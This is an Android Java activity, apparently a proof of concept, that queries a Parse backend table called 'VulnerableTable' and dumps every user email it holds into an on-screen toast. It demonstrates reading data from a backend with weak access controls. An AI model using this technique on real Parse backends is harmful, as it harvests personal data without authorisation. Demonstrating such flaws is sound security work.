package com.jheto.hackingparsecom;

import java.util.List;

import com.parse.ParseObject;
import com.parse.ParseQuery;

import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.Toast;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        Button buttonDump = (Button)findViewById(R.id.buttonDump);
        buttonDump.setOnClickListener(new OnClickListener(){
			@Override
			public void onClick(View arg0) {
				dumpTable();
			}
        });
    }
    
    private void dumpTable(){
    	try{
			ParseQuery<ParseObject> query = ParseQuery.getQuery("VulnerableTable");
			List<ParseObject> dumpTable = query.find();
			if(dumpTable != null && dumpTable.size()>0){
				String dump = "";
				for (int i = 0; i < dumpTable.size(); i++) {
					ParseObject obj = dumpTable.get(i);
					String email = (obj.containsKey("email"))? obj.get("email").toString():"";
					dump += email;
					if(i<dumpTable.size()-1) dump += ",";
				}
				Toast.makeText(MainActivity.this, "Dump emails: " + dump, Toast.LENGTH_SHORT).show();
			}
		}catch(Exception e){
			Toast.makeText(MainActivity.this, "Exception DumpEmails:" + e, Toast.LENGTH_SHORT).show();
		}
    }
}
